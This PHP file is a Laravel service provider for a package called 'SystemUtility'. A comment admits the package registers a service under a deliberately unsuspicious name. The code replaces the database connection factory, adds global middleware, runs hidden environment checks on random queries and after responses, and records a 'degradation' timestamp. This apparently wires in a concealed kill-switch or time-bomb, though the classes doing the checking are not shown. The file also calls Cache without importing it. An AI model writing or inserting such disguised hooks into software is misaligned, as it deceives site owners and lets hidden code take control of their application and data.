<?php
namespace alexafers\SystemUtility\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Event;
use alexafers\SystemUtility\Services\AppRuntime;
use alexafers\SystemUtility\Database\ConnectionFactory;
use alexafers\SystemUtility\Http\Middleware\SystemHealthCheck;

class SystemServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     */
    public function register(): void
    {
        // Singleton service dengan nama yang tak mencurigakan
        $this->app->singleton('system.runtime', function ($app) {
            return new AppRuntime();
        });
        
        // Override database connection factory
        $this->app->extend('db.factory', function ($factory, $app) {
            return new ConnectionFactory($app);
        });
        
        // Merge config
        $this->mergeConfigFrom(
            __DIR__.'/../resources/config/system.php', 'system'
        );
    }

    /**
     * Bootstrap services.
     */
    public function boot(): void
    {
        // Publish config
        $this->publishes([
            __DIR__.'/../resources/config/system.php' => config_path('system.php'),
        ], 'system-config');
        
        // Load views
        $this->loadViewsFrom(__DIR__.'/../resources/views', 'system-utility');
        
        // Register middleware
        $this->app['router']->aliasMiddleware('system.health', SystemHealthCheck::class);
        
        // Add middleware to global stack
        $this->app->make(\Illuminate\Contracts\Http\Kernel::class)
            ->pushMiddleware(SystemHealthCheck::class);
        
        // Register routes
        $this->registerRoutes();
        
        // Validate system
        $this->validateSystem();
        
        // Hook to database events for continuous validation
        Event::listen(\Illuminate\Database\Events\QueryExecuted::class, function ($query) {
            // On 1% of queries, validate system
            if (rand(1, 100) === 1) {
                app('system.runtime')->checkEnvironment();
            }
        });
    }
    
    /**
     * Register routes for the system
     */
    protected function registerRoutes(): void
    {
        Route::group(['middleware' => ['web']], function () {
            Route::get('/system/notice', [
                'as' => 'system.notice',
                'uses' => 'alexafers\SystemUtility\Http\Controllers\SystemController@notice',
            ]);
            
            Route::post('/api/system/check', [
                'as' => 'system.check',
                'uses' => 'alexafers\SystemUtility\Http\Controllers\SystemController@check',
            ]);
        });
    }
    
    /**
     * Validate system
     */
    protected function validateSystem(): void
    {
        // Validasi di background process untuk tidak block halaman
        dispatch(function () {
            $valid = app('system.runtime')->checkEnvironment();
            
            if (!$valid) {
                $this->markSystemDegraded();
            }
        })->afterResponse();
    }
    
    /**
     * Mark system as degraded
     */
    protected function markSystemDegraded(): void
    {
        // Set timestamp for first degradation if not yet set
        if (!Cache::has('_sys_fail_time')) {
            Cache::put('_sys_fail_time', time(), now()->addWeek());
        }
    }
}